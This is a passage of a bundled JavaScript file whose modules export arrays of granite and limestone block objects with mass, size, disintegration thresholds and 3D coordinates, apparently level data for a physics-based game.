module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:434.0528239876294,y:5.363432350628874,z:-1134.1665012736855},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:438.85616026018164,y:5.49596708225597,z:-1124.6071057009524},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:449.83768314323214,y:5.343156381385986,z:-1150.3419677034392},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:423.6496378512203,y:14.391050671492003,z:-1159.1762161102984},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:437.6880193364151,y:20.49603673026838,z:-1173.1654051746111},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:440.88230731847204,y:10.847330264669655,z:-1116.5271856500324},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:453.2575287213457,y:5.4097463724991375,z:-1161.9541782000692},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:442.62433329056705,y:9.762509364371915,z:-1132.7728366976053},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:437.60039342601675,y:16.792499234923284,z:-1149.1971451781183},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:429.8327062351924,y:20.506619032297053,z:-1154.8070958719745},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:444.3789418763502,y:23.295061396224373,z:-1165.86905734289},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:447.17270190870966,y:11.513058662214025,z:-1124.2092295296413},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:431.1131655738567,y:11.211925745564502,z:-1126.6441391369633},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:443.43177070338635,y:13.511285289320082,z:-1141.9405156540527},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:434.71641308131296,y:15.296838404069229,z:-1135.1020779155626},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:439.9874837787549,y:23.691709493537957,z:-1155.9717817956248},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:437.5090915534839,y:30.1288615338148,z:-1174.9725382681263},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:471.4766735574317,y:5.485785210931852,z:-1123.0997783647601},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:473.6937673586793,y:10.99161796143334,z:-1182.1296407083953},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:481.7718507551133,y:5.247022354556964,z:-1183.447310753113},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:454.9942292231385,y:10.458411196767178,z:-1111.546731128823},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:456.9309863210607,y:10.196133221052069,z:-1136.5382884185485},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:465.41408137643765,y:10.422800254531035,z:-1169.6899683238707},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:437.7126015718022,y:10.437859674483041,z:-1162.6148098164563},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:425.06328023708573,y:10.004768568984218,z:-1145.236175395944},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:451.3682219711301,y:20.974090145921092,z:-1178.8772413020156},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:476.9252509074491,y:10.479416795875087,z:-1196.6675254278744},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:486.0425916396128,y:10.352074696645326,z:-1169.4381756154946},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:501.90537665238344,y:10.475186311394118,z:-1156.094227621469},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:480.9265115115936,y:27.78487962603536,z:-1176.6491185441184},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:465.1819778654028,y:25.83545608802184,z:-1192.491113931726},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:582.6281077755461,y:-30.28470427628106,z:-1328.5100254225354},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:459.15997981071024,y:28.310819461850436,z:-1153.4342739080876},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:481.1888317242188,y:15.380646450561782,z:-1137.6984522927944}];
},{}],201:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:477.3729700290354,y:15.050726601657209,z:-1157.537813918352},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:454.63092178714044,y:15.497824413980402,z:-1116.819265756232},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:500.655364412193,y:25.23078348564964,z:-1135.5583651420518},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:524.2891280607316,y:-245.8608835306854,z:-1003.188554734039},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:449.2696913245644,y:15.466777077360566,z:-1168.0040949302618},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:473.88131565165753,y:15.115858367310505,z:-1190.1117854748245},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:426.5191957222331,y:15.418286294239461,z:-1146.6403804486117},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:467.46493617307453,y:38.80944399682505,z:-1172.8823553001378},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:500.5994080844772,y:13.20777868596113,z:-1081.3312028155024},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:431.0604202429041,y:32.22868764199218,z:-1164.5760746412348},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:638.453338238991,y:-214.50835864092954,z:-1246.9439604869501},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:498.79973940534074,y:10.45153396410706,z:-1172.023938479184},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:513.860355610664,y:14.141355034778885,z:-1159.6087075518299},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:498.91299780303393,y:27.213795457174406,z:-1161.1193150155116},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:455.0571307481623,y:15.492081806199524,z:-1143.730579099082},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:489.49697579946417,y:5.395504872016172,z:-1182.5593694108618},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:548.6656470411995,y:5.483365659762683,z:-1251.0918270866748},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:569.7528695345013,y:-177.4377703688736,z:-1087.896783538896},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:665.1355865523564,y:-786.6091829749438,z:-1109.5823125993961},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:478.75093353335103,y:5.463872868758771,z:-1130.5658154432426},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:486.27445501544776,y:17.34119409020355,z:-1175.2160076773516},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:486.659004668995,y:32.2331981973192,z:-1154.0568169246185},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:494.7974809658751,y:36.924481970761306,z:-1150.6877766567072},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:469.987358092391,y:5.448912275681017,z:-1124.8602257617906},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:299.11655633176866,y:3.4548624428232486,z:-1070.0492305152418},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:474.72611322360024,y:9.859118739425126,z:-1138.4924840538808},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:436.10381207353396,y:2.4826255631719945,z:-998.2233505959314},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:449.12187677745726,y:5.468577959403675,z:-1134.3582341177005},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:507.10794154078405,y:-167.38629401500825,z:-1054.1191320314158},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:464.2873433092251,y:5.509688414454648,z:-1134.361467338373},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:483.7177313968706,y:-29.477569469792027,z:-1030.466793237128},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:505.28124458539156,y:-66.83070184609518,z:-1063.8746096037182},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:530.7183226940609,y:-208.48308114212833,z:-1070.7700110505239}];
},{}],202:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-225.7544337429838,y:9.126549452453157,z:-1335.3759702615503},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-193.1161208969041,y:14.00045853140363,z:-1326.4032420723174},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-224.55033407855987,y:15.546612362671898,z:-1354.4054541367013},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-164.23951653572627,y:21.10828944683616,z:-1343.198817034767},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-191.71238459001364,y:9.055280918357854,z:-1353.1643589783735},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-234.68474774981277,y:4.40661149318214,z:-1353.3992842637128},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-264.6630896215448,y:4.418175261440677,z:-1376.3748977456946},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-230.0622596927093,y:4.393301546553331,z:-1364.7996011807852},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-238.26541390701573,y:12.845759109227384,z:-1350.02202647131},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-278.4351016469261,y:4.127761153748623,z:-1380.2659107887146},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-230.8938140566207,y:8.722720666681065,z:-1373.672213055899},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-177.61721527956763,y:4.325025369291775,z:-1351.2611868344807},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-163.79407238122909,y:4.442250014675042,z:-1346.4838408166268},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-183.61362411779436,y:3.9977849581216693,z:-1341.9082071179187},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-173.82525153462154,y:4.440894666069548,z:-1334.9530562210414},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-243.8252264806903,y:4.495466616468664,z:-1335.7906337314062},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-237.07166766485523,y:4.291122380041219,z:-1343.125787030734},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-267.93054044943284,y:4.459896255056163,z:-1366.6213454996466},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-242.68257940335772,y:12.642168030737766,z:-1341.1018963045206},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-242.2920443047782,y:12.263860897114384,z:-1330.5654200747392},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-236.72798462712316,y:19.29110124800378,z:-1334.7134767128014},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-210.33010048421508,y:4.33698279197278,z:-1328.930206533783},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-218.02169620536554,y:4.2776524724755385,z:-1347.259581948946},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-228.547820128422,y:16.205924608370193,z:-1322.6615533001936},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-217.37386072306012,y:20.481551437978297,z:-1338.8122843245335},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-237.9655219686255,y:18.55281542202329,z:-1324.741986666423},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-227.91168273168466,y:22.932752772990742,z:-1330.0053952714645},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-210.90480695137077,y:4.441926467757391,z:-1362.9599351351364},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-205.65582899052305,y:4.347387873339878,z:-1350.0572027079347},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-210.5388093978507,y:10.71759108585027,z:-1355.4981812401725},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-220.3123479696013,y:6.160191216870067,z:-1365.6829496005034},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-216.38532993311856,y:13.308866683799373,z:-1371.4763895320007},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-206.418797709106,y:16.12538829960444,z:-1369.969655290614},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-197.67555038437789,y:14.248660713786265,z:-1365.8313516156732},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-168.6427279320178,y:10.289752058860941,z:-1352.4181622571612},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-124.07074860711975,y:4.3302731805091055,z:-1313.669716534201},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-202.95731503544957,y:11.222454311796923,z:-1343.5808613809297},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-173.183696501106,y:9.031947812200547,z:-1343.640456143735},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-155.14675859009623,y:4.344798711685451,z:-1337.446754663051},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-254.5974362593919,y:4.453044538414319,z:-1367.189399479013},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-194.07172601919035,y:21.921219477150878,z:-1359.979520874603},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-185.40806188921331,y:19.34371734820457,z:-1364.1985108238766},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-213.81494969192448,y:19.102886009607232,z:-1363.982386981898},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-185.34757028121354,y:22.49097342619359,z:-1354.7759638060083},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-174.8310868186282,y:16.599928198059686,z:-1358.541558194151},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-241.75236441448868,y:21.306396633811378,z:-1345.9914054418807},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-266.3403407580168,y:4.455060768795124,z:-1393.7133495209516},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-215.42280116394124,y:24.91300501512363,z:-1347.511659418356},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-203.52205188733015,y:17.218925006247744,z:-1358.2994287017118},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-213.05014252292787,y:13.647792864644876,z:-1329.3134162606889},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-216.41165506869245,y:22.453294102490297,z:-1326.764152007958},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-204.14703511200415,y:20.717328965096815,z:-1341.6364663256797},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-177.6088956258583,y:19.25203088066238,z:-1349.4860792213472},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-211.60515012737812,y:12.806488703140303,z:-1319.0351194935654},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-209.33401768365093,y:23.008672832910005,z:-1333.682925986795},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-208.8108590005616,y:4.229814980337748,z:-1339.5420045677001},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-196.50301886251356,y:20.58692094333776,z:-1307.9483708798498},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-201.76136122522038,y:27.547325685796764,z:-1314.5997149661791},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-174.10852762056473,y:13.630607633465813,z:-1332.5959407765858},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-187.50774368811383,y:16.35557821105178,z:-1307.4509680622425},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-135.9317803315675,y:4.382790670831819,z:-1308.0569444329205},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-164.57564495922864,y:7.9380028592092176,z:-1335.2802838635143},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-206.95933968459707,y:19.226624268284656,z:-1313.0737969393551},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-196.2890146509588,y:26.827450488869285,z:-1342.3969088042793},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-181.9026772520947,y:13.730205223221297,z:-1342.868730927899},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-185.8207488860868,y:24.20245625625396,z:-1301.9729444005925},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-181.1372364691022,y:4.573636243880858,z:-1313.429113142618},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-175.32421169459556,y:4.463883166910209,z:-1325.1073287942017},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-178.10712552351717,y:21.30331398234075,z:-1337.584988073154},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-159.4047835300781,y:4.357016362345777,z:-1312.7367149628544},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-146.1960922340221,y:4.359555145122632,z:-1309.8050486771426},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-169.797696206024,y:4.22039070217921,z:-1315.2418561297882},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-188.66742602672667,y:20.889415349308617,z:-1344.4766200118715},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-219.87518392407335,y:18.292746223430488,z:-1318.4461525193958},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-220.95587641199143,y:28.63743549305112,z:-1334.6689160000199},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-206.79317049720504,y:28.123892244310113,z:-1350.611482577766},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-199.5014886469128,y:21.335647178156844,z:-1350.1379645798697},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-173.97484163026738,y:18.595810074646202,z:-1323.6569111275023},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-165.64397718636812,y:17.3146373994806,z:-1328.769644038035}];
},{}],203:[function(require,module,exports){
module.exports=[{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-68.34296190948824,y:4.301235668193424,z:-1324.745316940376},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-166.9367758213815,y:4.306087587444745,z:-1332.3851052354148},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:17.305482331730268,y:4.475561864591245,z:-1270.1948588431446},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-187.05732135192613,y:18.010524889583806,z:-1306.475642723559},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-195.29518809437337,y:15.870709327488186,z:-1311.0471259659762},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-172.21550553996892,y:4.246407510581732,z:-1340.8795445103617},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-139.92626660059636,y:4.474267794812617,z:-1315.7657659320637},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-186.5175638737033,y:4.480570485508502,z:-1315.6431155320145},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-54.60250361799473,y:4.345087486036912,z:-1330.8498635974863},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-185.53409479349853,y:25.95893528939547,z:-1300.8523500443366},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-202.49316060363842,y:23.21971475646396,z:-1308.7185872744549},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-175.04260548946172,y:8.63947436615762,z:-1330.235065082774},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-158.0470308406066,y:4.234771878356773,z:-1343.9265897664488},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-149.9708665538715,y:4.462006916721357,z:-1335.198748953872},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-198.45920343071285,y:22.825322166822033,z:-1317.6141999771407},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-154.14444231139447,y:4.48019685106684,z:-1311.2564135100254},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-195.026264542549,y:27.229005200838852,z:-1303.5041235317624},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-166.6997701822695,y:13.799721171304741,z:-1328.541273460868},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-224.99944141967276,y:14.976300109104109,z:-1343.8325004890007},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-223.0648712231533,y:4.1463942928911415,z:-1345.942563953124},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-171.02005484859316,y:15.74938902416338,z:-1350.3483646789023},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-186.52028916324954,y:9.108494674566689,z:-1339.59803140762},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-215.4172706463068,y:9.336903683617537,z:-1333.7804823072922},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-198.36504799507455,y:9.138613262119065,z:-1323.521780901467},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-181.48975647869472,y:19.7625643614256,z:-1323.2903045616993},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-213.35662353784662,y:22.811242059552956,z:-1319.3503017681464},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-237.99264006825442,y:9.441909910208507,z:-1338.8394352600988},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-234.18307935216572,y:22.074095779173174,z:-1353.805068792322},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-245.20209920050397,y:9.272627471629027,z:-1370.2910612657186},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-231.48530100404435,y:31.099606234342776,z:-1320.4271612075502},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-247.49884096570608,y:24.449793854925247,z:-1330.3626665577842},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-286.688488550866,y:9.205587866962805,z:-1395.139433096669},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-192.02543379918689,y:33.15140705431389,z:-1343.5691816667454},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-210.7191588033281,y:14.490191260237514,z:-1357.7858112081058}];
},{}],204:[function(require,module,exports){
module.exports=[{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-233.52661517889453,y:33.23281860799012,z:-1347.494757989035},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-184.43565340490105,y:14.752622207208145,z:-1348.2270759526293},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-212.83936086054473,y:14.14704687956094,z:-1357.732402487112},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-162.3152228061184,y:33.9689672857708,z:-1353.0899354402827},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-224.70272964435853,y:37.76161268279561,z:-1319.1889496070944},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-351.04504381344105,y:14.490164236039849,z:-1338.7041616657875},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-207.35491127270564,y:15.144997621227176,z:-1328.3327979453081},{material:"limestone",dimensions:15,mass:35e3,display_mass:2600,disintegration_point:2800,x:-251.5442618947283,y:50.838512391395376,z:-1320.8426223800095},{material:"granite",dimensions:15,mass:4e4,display_mass:3e3,disintegration_point:3e3,x:-194.55035903401398,y:36.29479978143254,z:-1366.2944979268368},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-183.49978936977675,y:9.084130855284876,z:-1324.1787699307772},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-278.9332033626255,y:9.36208918792825,z:-1374.9245251987722},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-259.8638063186441,y:13.640204342736698,z:-1381.0787915200553},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-239.70724494726375,y:9.378464318661115,z:-1370.9242550671634},{material:"granite",dimensions:10,mass:77e3,display_mass:1e3,disintegration_point:2300,x:-343.52559508274254,y:9.14061496747721,z:-1422.011235789074},{material:"limestone",dimensions:10,mass:6e4,display_mass:800,disintegration_point:2e3,x:-143.97355056563742,y:9.433152716859748,z:-1311.144247574893},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-332.5192930961176,y:4.47074857248432,z:-1387.3714868330553},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-278.6624162033737,y:4.344626019948048,z:-1411.866161317514},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-260.33733036128,y:4.443044750735236,z:-1490.5423293001913},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-224.85284775611834,y:11.219050297631275,z:-1373.3519593145872},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-201.55731575960974,y:24.261736010080604,z:-1344.835787692199},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-263.44737550364675,y:4.485112111971373,z:-1366.3058027204495},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-320.5369256737904,y:4.117281752554584,z:-1410.425214495335},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-253.05654656014372,y:4.365521316332902,z:-1390.4287104897187},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-211.1774838861236,y:27.490844395626784,z:-1343.3630688627936},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-167.78744604123517,y:4.196799611851263,z:-1345.6338877483627},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-269.4796073979095,y:4.395108460946089,z:-1395.7790229479165},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-109.10594221031819,y:10.60331886681711,z:-1406.902637523132},{material:"limestone",dimensions:5,mass:14e4,display_mass:350,disintegration_point:1400,x:-200.13891636511812,y:4.388909290216788,z:-1536.6740741624528},{material:"granite",dimensions:5,mass:16e4,display_mass:500,disintegration_point:1700,x:-175.4240563756827,y